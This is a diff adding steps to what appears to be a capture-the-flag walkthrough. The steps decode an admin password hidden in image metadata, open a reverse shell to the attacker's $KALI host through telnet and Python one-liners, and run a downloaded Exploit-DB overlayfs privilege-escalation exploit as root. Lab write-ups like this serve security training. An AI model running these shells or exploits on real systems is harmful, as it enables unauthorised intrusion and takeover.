@@ -172,6 +172,9 @@ RETR 1
 
 <figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/image (610).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (611).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -179,30 +182,105 @@ RETR 1
 
 
 
+<figure><img src="../../.gitbook/assets/image (612).png" alt=""><figcaption></figcaption></figure>
+
+
+
+**Kali**
+
+```
+exiftool for-007.jpg 
+echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d 
+```
+
+<figure><img src="../../.gitbook/assets/image (613).png" alt=""><figcaption></figcaption></figure>
+
+
+
+It was the password for admin
+
+```
+Username: admin
+Password: xWinter1995x!
+```
+
+
+
+## **Initial Shell**
+
+**Kali**
+
+```
+nc -lvnp 4444
+```
+
+**Browser**
+
+```
+sh -c '(sleep 4062|telnet $KALI 4444|while : ; do sh && break; done 2>&1|telnet $KALI 4444 >/dev/null 2>&1 &)'
+```
+
+<figure><img src="../../.gitbook/assets/image (616).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/image (617).png" alt=""><figcaption></figcaption></figure>
+
+It kind of worked but the shell kept breaking so I switched it to a python one and did the same thing.
+
+**Kali**
+
+<pre><code><strong>nc -lvnp 4444
+</strong></code></pre>
+
+**Browser**
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$KALI",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+```
+
+<figure><img src="../../.gitbook/assets/image (618).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (619).png" alt=""><figcaption></figcaption></figure>
+
+
+
+Get autocomplete
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+ctrl + Z
+stty raw -echo;fg
+```
 
 
 
 
 
+### Privlege Escalation
 
+Just changed below line from gcc to cc as gcc is not installed on the host
 
+**Kali**
 
+```
+wget https://www.exploit-db.com/raw/37292 -O ofs.c 
+python2 -m SimpleHTTPServer 81
+```
 
+<figure><img src="../../.gitbook/assets/image (620).png" alt=""><figcaption></figcaption></figure>
 
+**Victim**
 
+```
+cd /tmp/
+wget http://$KALI:81/ofs.c 
+id
+cc ofs.c -o ofs
+./ofs
+id
+whoami
+```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image (621).png" alt=""><figcaption></figcaption></figure>
 
